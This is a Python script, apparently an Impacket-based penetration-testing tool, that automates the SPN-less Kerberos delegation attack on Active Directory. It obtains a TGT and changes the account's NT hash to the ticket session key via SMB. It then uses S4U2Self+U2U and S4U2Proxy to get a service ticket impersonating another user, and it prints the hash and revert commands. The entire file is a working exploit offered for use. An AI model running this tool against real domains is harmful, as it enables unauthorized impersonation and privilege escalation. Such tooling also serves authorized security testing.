import argparse
import logging
import sys
import os

from impacket.examples import logger
from impacket.examples.utils import parse_identity
from impacket.krb5.ccache import CCache

from utils.getTGT import GETTGT
from utils.getST import GETST
from utils.changepasswd import SmbPassword

from unicrypto.hashlib import md4 as MD4

# Parse the credential cache
def parse_ccache(ccache):
    return CCache.loadFile(ccache).credentials[0].toTGS()["sessionKey"].contents

# RC4 hashing algorithm
# https://github.com/skelsec/pypykatz/blob/04117bf59569304f89b98af8d666515169decd00/pypykatz/utils/crypto/winhash.py#L28
def NT(password):
    if password is None or password == '':
        return bytes.fromhex('31d6cfe0d16ae931b73c59d7e0c089c0')
    password_bytes = password.encode('utf-16-le')
    md4 = MD4(password_bytes)
    return md4.digest()

def spnless(options):

    # Request a TGT
    logging.info("Requesting a TGT")
    if password:
        logging.info("Calculating RC4 value of the provided password")
        options.hashes = ":" + NT(password).hex()
        logging.info("NT Hash: %s", options.hashes)
        tgt = GETTGT(username, None, domain, options)
        tgt.run()
    else:
        tgt = GETTGT(username, password, domain, options)
        tgt.run()

    # Parse the ccache and extract the RC4 ticket session key
    ccache = str(username + ".ccache")
    ccache_bytes = parse_ccache(ccache)
    newPwdHashNT = ccache_bytes.hex()
    logging.info("Ticket Session Key: %s", newPwdHashNT)

    # Change the users password into the ticket session key using DCE/RPC
    oldPwdHashNT = options.hashes.split(':')[-1] # changepasswd doesn't like the colun
    cp = SmbPassword(
            address=options.dc_ip,
            domain=domain,
            authUsername=username,
            authPwdHashNT=oldPwdHashNT, 
            )
        
    cp.changePassword(
            targetUsername=username,
            targetDomain=domain,
            oldPwdHashNT=oldPwdHashNT,
            newPwdHashNT=newPwdHashNT
            )

    # Set KRB5CCNAME and request a ST using S4U2Self+U2U and S4U2Proxy
    os.environ["KRB5CCNAME"] = username + ".ccache"
    options.k = True
    options.no_pass = True
    options.u2u = True
    options.altservice = None
    st = GETST(username, None, domain, options)
    st.run()

    # Generate password reset command dynamically
    if password:
        print(f"\n[*] To revert the password, run: changepasswd.py {options.identity}@{options.dc_ip} -hashes :{newPwdHashNT} -newpass {password}")
    else:
        print("\n[*] NT hash used. Reverting the hash is only possible if the PASSWORD_NEVER_EXPIRES flag is set.")
        print(f"[*] To revert the hash, run: changepasswd.py {options.identity}@{options.dc_ip} -hashes :{newPwdHashNT} -newhashes :{oldPwdHashNT}")

if __name__ == '__main__':

    parser = argparse.ArgumentParser(add_help=True, description="Given a password or hash it will request a "
                                                                "service ticket using SPNless")
    parser.add_argument('identity', action='store', help='[domain/]username[:password]')
    parser.add_argument('-spn', action="store", required=True,  help='SPN (service/server) of the target service the '
                                                                     'service ticket will' ' be generated for')
    parser.add_argument('-impersonate', action="store",  help='target username that will be impersonated (thru S4U2Self+U2U and S4U2Proxy)'
                                                              ' for quering the ST. Keep in mind this will only work if '
                                                              'the identity provided in this scripts is allowed for '
                                                              'delegation to the SPN specified')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                       '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                       'ones specified in the command line')
    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                       'ommited it use the domain part (FQDN) specified in the target parameter')
    if len(sys.argv)==1:
        parser.print_help()
        print("\nExamples: ")
        print("\t./getSPNless.py -spn cifs/contoso-dc -hashes lm:nt contoso.com/user\n")
        print("\tit will use the lm:nt hashes for authentication. If you don't specify them, a password will be asked")
        sys.exit(1)
    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts, options.debug)

    domain, username, password, _, _, options.k = parse_identity(options.identity, options.hashes, options.no_pass, options.k)

    if domain is None:
        logging.critical('Domain should be specified!')
        sys.exit(1)

    try:
        spnless(options)


    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        print(str(e))